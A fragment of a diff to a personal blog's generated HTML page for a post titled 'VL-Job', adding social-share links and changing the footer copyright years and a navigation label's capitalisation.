+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/02/VL-Job/&is_video=false&description=VL-Job"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Job&body=Check out this article: http://example.com/2025/04/02/VL-Job/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/02/VL-Job/&name=VL-Job&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/02/VL-Job/&t=VL-Job"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -307,7 +308,7 @@
     Copyright &copy;
     
     
-    2016-2025
+    2024-2027
     Panosoiko
   </div>
   <div class="footer-right">
@@ -322,7 +323,7 @@
      --><!--
        --><li><a href="/search/">Search</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/tags/">tags</a></li><!--
      --><!--
        --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
      -->
